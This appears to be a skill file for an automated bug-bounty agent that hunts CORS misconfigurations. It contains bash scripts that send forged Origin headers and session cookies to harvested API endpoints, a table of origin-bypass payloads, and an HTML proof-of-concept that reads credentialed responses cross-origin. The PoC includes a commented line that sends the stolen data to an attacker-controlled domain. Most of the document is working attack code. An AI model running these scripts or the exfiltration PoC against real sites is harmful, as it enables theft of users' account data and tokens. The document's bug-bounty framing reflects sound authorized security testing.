---
name: k1nzr3c0n-hunt-cors
description: "CORS misconfiguration hunting skill. Covers reflect-any-origin, null origin, subdomain regex bypass, vary-header analysis, credentialed CORS exfil PoC required. Never-submit: CORS wildcard without credential exfil proof. Browser PoC required for bounty."
tags: [cors, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — CORS Misconfiguration

> **Never submit**: CORS wildcard (*) alone without credential exfiltration PoC.
> **Browser PoC required**: curl shows the headers; browser fetch() proves credential leak.

---

## Crown Jewels

```
Priority 1 — Credentialed CORS: reflects arbitrary origin + withCredentials + sensitive response
Priority 2 — Null origin bypass: file:// or sandboxed iframe tricks
Priority 3 — Subdomain regex bypass: evil.target.com or targetXevil.com
Priority 4 — Pre-domain bypass: attacker.com/target.com reflection
Priority 5 — POST-only CORS: state-changing requests from any origin
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_cors_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

# Collect all API endpoints (CORS matters most on API/auth endpoints)
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+(?:/api/|/v[0-9]/|/graphql|/auth|/user|/account|/me|/profile)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/api_endpoints.txt" | wc -l \
  | xargs echo "API endpoints for CORS testing:"
```

## Phase 1 — Basic CORS Check

```bash
echo "=== CORS Basic Detection ==="

for EP in $(head -30 "$HUNT/api_endpoints.txt"); do
  # Test arbitrary origin reflection
  RESP_HEADER=$(curl -sk -I "$EP" \
    -H "Origin: https://evil.com" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    | grep -i 'access-control')
  
  ACAO=$(echo "$RESP_HEADER" | grep -i 'access-control-allow-origin' | tr -d '\r\n')
  ACAC=$(echo "$RESP_HEADER" | grep -i 'access-control-allow-credentials' | tr -d '\r\n')
  
  if echo "$ACAO" | grep -qi 'evil.com'; then
    echo "  [REFLECT] $EP"
    echo "    $ACAO"
    echo "    $ACAC"
    [ "$(echo "$ACAC" | grep -ic 'true')" -gt 0 ] && echo "    *** CREDENTIALED CORS — HIGH IMPACT ***"
  fi
done
```

## Phase 2 — Bypass Techniques

```bash
echo "=== CORS Bypass Techniques ==="
TEST_EP="${CORS_ENDPOINT:-https://${TARGET}/api/me}"

# Test each bypass
declare -A BYPASSES=(
  ["reflect-any"]="https://evil.com"
  ["null-origin"]="null"
  ["subdomain-prefix"]="https://evil.${TARGET}"
  ["subdomain-suffix"]="https://${TARGET}.evil.com"
  ["pre-domain"]="https://attacker.com.${TARGET}"
  ["protocol-http"]="http://${TARGET}"
  ["case-variation"]="hTTps://EVIL.COM"
  ["url-encoded"]="https://evil%2ecom"
  ["empty-string"]=""
)

for LABEL in "${!BYPASSES[@]}"; do
  ORIGIN="${BYPASSES[$LABEL]}"
  ACAO=$(curl -sk -I "$TEST_EP" \
    -H "Origin: ${ORIGIN}" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    | grep -i 'access-control-allow-origin' | tr -d '\r\n')
  ACAC=$(curl -sk -I "$TEST_EP" \
    -H "Origin: ${ORIGIN}" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    | grep -i 'access-control-allow-credentials' | tr -d '\r\n')
  
  echo "  [$LABEL] Origin: '${ORIGIN:0:40}'"
  echo "    ACAO: $ACAO"
  [ -n "$ACAC" ] && echo "    ACAC: $ACAC"
done
```

## Phase 3 — Credentialed CORS PoC (Browser Required)

```bash
echo "=== Credentialed CORS PoC Template ==="
VULN_EP="${CORS_ENDPOINT:-https://${TARGET}/api/me}"
ATTACKER_DOMAIN="${ATTACKER_DOMAIN:-https://attacker.example.com}"

cat << HTML
<!-- Host on $ATTACKER_DOMAIN/cors-poc.html -->
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Credential Exfiltration PoC</h1>
<pre id="output">Loading...</pre>
<script>
fetch('${VULN_EP}', {
  credentials: 'include',  // sends cookies
  headers: {'Content-Type': 'application/json'}
})
.then(r => r.json())
.then(data => {
  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
  // In real attack: send to attacker
  // fetch('${ATTACKER_DOMAIN}/log?data=' + encodeURIComponent(JSON.stringify(data)));
})
.catch(e => document.getElementById('output').textContent = 'Error: ' + e);
</script>
</body>
</html>
HTML

echo ""
echo "Steps to prove impact:"
echo "  1. Host CORS PoC on attacker domain"
echo "  2. Log in to ${TARGET} as test user in same browser"
echo "  3. Visit PoC page from same browser"
echo "  4. Screenshot: PoC shows target's account data (email, tokens, etc.)"
```

## Phase 4 — Vary Header Analysis

```bash
echo "=== Vary Header Analysis ==="
# If Vary: Origin is present, CORS is dynamic (might be misconfigured)
TEST_EP="${CORS_ENDPOINT:-https://${TARGET}/api/}"

VARY=$(curl -sk -I "$TEST_EP" | grep -i '^Vary:')
echo "  Vary header: $VARY"
echo "$VARY" | grep -qi 'Origin' && echo "  [INFO] Dynamic CORS — test all bypass variants"
echo "$VARY" | grep -qiE 'Origin.*Credentials|Credentials.*Origin' && echo "  [INFO] Both cached — try cache-poisoning via CORS"
```

## Phase 5 — Gate 0

```bash
echo "=== CORS Gate 0 ==="
echo "  □ Arbitrary origin reflected in ACAO header"
echo "  □ Access-Control-Allow-Credentials: true"  
echo "  □ Sensitive data in response (auth token, PII, account data)"
echo "  □ Browser PoC works with logged-in session (not just curl)"
echo "  □ Impact: credential/token exfil possible, not just header reflection"
echo ""
echo "  NEVER SUBMIT: CORS wildcard (*) alone = ACAC cannot be true with *"
echo "  NEVER SUBMIT: CORS header without sensitive response data"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
CORS misconfiguration on [/api/me] reflects arbitrary origin with credentials: true, allowing cross-origin account data theft
Subdomain CORS bypass: [evil.target.com] accepted as trusted origin on [/api/v1/user] leaking authentication tokens
```
